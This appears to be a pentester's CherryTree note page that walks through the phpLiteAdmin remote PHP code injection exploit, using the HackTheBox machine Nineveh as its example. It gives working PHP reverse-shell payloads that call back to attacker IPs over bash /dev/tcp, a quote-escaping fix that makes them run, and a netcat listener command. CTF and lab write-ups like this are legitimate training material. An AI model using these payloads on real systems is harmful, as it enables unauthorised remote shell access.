<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>1.9.3 Remote PHP Code Injection</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># 1.9.3 Remote PHP Code Injection</h1></strong><br />A description for the vulnerability can be found here:<br /><a href="https://www.exploit-db.com/exploits/24044">https://www.exploit-db.com/exploits/24044</a><br /><br />In essence, you create a database with a <code>.php</code> extension, write PHP code into one of the tables, and browse to the path of the <code>.php</code> database to execute the code.<br /><br />The images throughout the exploit don&#39;t work any more, but the author has a video demonstration of the exploit on YouTube.<br /><a href="https://www.youtube.com/watch?v=G1i5oWblx9Q">https://www.youtube.com/watch?v=G1i5oWblx9Q</a><br /><br /><strong>Summary</strong><br />1. Create a new .php database - e.g. <code>bears.php</code><br />2. Create a table in that database - e.g. <code>tableTest</code><br />3. In that table, create a new TEXT field containing a php reverse shell - e.g. <code>&lt;?php exec(&quot;/bin/bash -c \&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.12/9001 0&gt;&amp;1\&quot;&quot;); ?&gt;</code><br />4. Navigate back to your new database&#39;s home and check the database path - e.g. <code>/var/tmp/bears.php</code><br />5. Browse to <code>/var/tmp/bears.php</code> (usually by LFI or something) to activate your reverse shell/command execution<br /><br /><strong>Examples</strong><br />• hackthebox Nineveh<br />• OSCP 10.11.116 - Dotty<br /><br /><strong><h2>## Example from hackthebox Nineveh</h2></strong><br />The exploit requires a bit of modification for it to work against this box.<br />The only way for us to browse to our created database is via the file inclusion found earlier on <code>http://10.10.10.43/department/manage.php</code>.<br />We know that the file inclusion vuln will only include files named <code>ninevehNotes</code>, so we have to name our database <code>ninevehNotes.php</code>.<br />After that, the exploit the is more or less the same.<br /><br />First, create a new database named <code>ninevehNotes.php</code>.<br /><a href=""><img src="images/229-1.png" alt="images/229-1.png" /></a><br /><br />Switch to the databse by clicking on it.<br /><a href=""><img src="images/229-2.png" alt="images/229-2.png" /></a><br /><br />Create a new table in the databse with 1 field<br /><a href=""><img src="images/229-3.png" alt="images/229-3.png" /></a><br /><br />Create a field in the table, with a Type of <code>TEXT</code>, and set the Default Value to a simple php reverse shell that points to your attacking machine (credit goes here - <a href="https://gist.github.com/rshipp/eee36684db07d234c1cc">https://gist.github.com/rshipp/eee36684db07d234c1cc</a>)<br /><br />Original linked above - <code>&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.0.0.10/1234 0&gt;&amp;1&#39;&quot;); ?&gt;</code><br />Modified version for phpLiteAdmin - <code>&lt;?php exec(&quot;/bin/bash -c \&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.12/9001 0&gt;&amp;1\&quot;&quot;); ?&gt;</code><br /><br />When inserting the above php code into a sqlite table, the <code>&#39;</code> will get converted into <code>&quot;</code>, which will cause your shell to fail.<br />You can either modify php code after it&#39;s been injected into the table via phpLiteAdmin, or simply escape the inner <code>&quot;</code> using <code>\</code>.<br /><br /><a href=""><img src="images/229-4.png" alt="images/229-4.png" /></a><br /><br /><a href=""><img src="images/229-5.png" alt="images/229-5.png" /></a><br /><br />Our PHP code has been &quot;injected&quot;!<br />To run the php code, we just need to browse to it.<br />On the phpLiteAdmin homepage you&#39;ll see that path to your database - <code>/var/tmp/ninevehNotes.php</code><br /><a href=""><img src="images/229-6.png" alt="images/229-6.png" /></a><br /><br />Start a listener on your attacking machine to receive the shell<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/nineveh#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br />listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...</div></div><br /><br />And browse to the created .php database via the website to run your injected PHP code.</div>
</body>
</html>
